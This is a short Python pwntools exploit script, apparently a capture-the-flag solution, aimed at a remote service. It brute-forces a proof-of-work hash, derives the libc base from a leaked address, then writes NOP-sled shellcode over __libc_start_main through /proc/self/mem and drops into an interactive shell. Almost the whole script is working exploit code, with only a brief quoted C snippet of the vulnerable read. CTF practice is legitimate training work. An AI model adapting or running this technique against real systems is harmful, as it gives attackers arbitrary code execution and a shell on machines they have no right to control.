#! /usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux','splitw','-h']

p = remote('chuj.top', '51617')
libc = ELF('libc-2.27.so')

from pwn import *
from pwnlib.util.iters import mbruteforce
import itertools
import base64

p.recvuntil(') == ')
hash_code = p.recvuntil('\n', drop=True).decode().strip()
log.success('hash_code={},'.format(hash_code))

charset = string.printable
proof = mbruteforce(lambda x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, 4, method='fixed')

p.sendlineafter('????> ', proof)

p.recvuntil("write: ")
write = int(p.recvuntil('\n', drop = True), base = 16)
log.success('write: ' + hex(write))

libc.address = write-libc.sym['write']
log.success('libc.address: ' + hex(libc.address))

__libc_start_main_addr = libc.sym['__libc_start_main']
log.success("__libc_start_main_addr: " + hex(__libc_start_main_addr))

p.sendlineafter(">> ", '/proc/self/mem\x00')
p.sendlineafter(">> ", str(__libc_start_main_addr))

payload = asm(shellcraft.sh()).rjust(0x580, asm('nop')) + b'\n'
p.sendafter(">> ", payload)

p.interactive()

# 0x8F770

'''
printf("now, input the place you want to write:\n>> ");
read(0, offset_buf, 0x10);
offset = atoll(offset_buf);
'''

